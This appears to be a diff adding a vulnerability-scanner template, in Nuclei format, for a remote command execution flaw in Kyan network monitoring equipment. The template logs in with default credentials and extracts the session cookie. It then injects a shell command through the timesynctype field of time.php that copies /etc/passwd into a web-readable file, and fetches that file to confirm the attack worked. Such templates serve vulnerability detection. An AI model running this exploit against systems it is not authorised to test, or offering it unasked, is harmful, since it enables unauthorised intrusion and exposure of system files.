@@ -1,0 +1,76 @@
+id: poc-kyan-network-monitoring-equipment-time-php-rce
+
+info:
+  name: Kyan Network Monitoring Equipment time.php Remote Command Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce
+
+variables:
+  t1: "{{rand_int(2000, 3000)}}"
+
+flow: |
+  http(1) && http(2) && http(3)
+
+http:
+  - id: login
+    method: POST
+    path:
+      - "{{BaseURL}}/login.php"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "user=admin&passwd=admin1234&x=49&y=24"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 302
+      - type: regex
+        part: header
+        regex:
+          - "PHPSESSID=(?<cookie>[0-9a-z]+)"
+    extractors:
+      - type: regex
+        name: cookie
+        part: header
+        regex:
+          - "PHPSESSID=(?<cookie>[0-9a-z]+)"
+        internal: true
+
+  - id: execute-command
+    method: POST
+    path:
+      - "{{BaseURL}}/time.php"
+    headers:
+      Cookie: "PHPSESSID={{cookie}}"
+      Content-Type: application/x-www-form-urlencoded
+    body: "timesynctype=;cat+/etc/passwd>{{t1}}.txt"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - ""
+        part: body
+
+  - id: check-output
+    method: GET
+    path:
+      - "{{BaseURL}}/{{t1}}.txt"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "root:"
+          - "/bin"
+        part: body
+      - type: word
+        words:
+          - "<"
+        part: body
+        negative: true
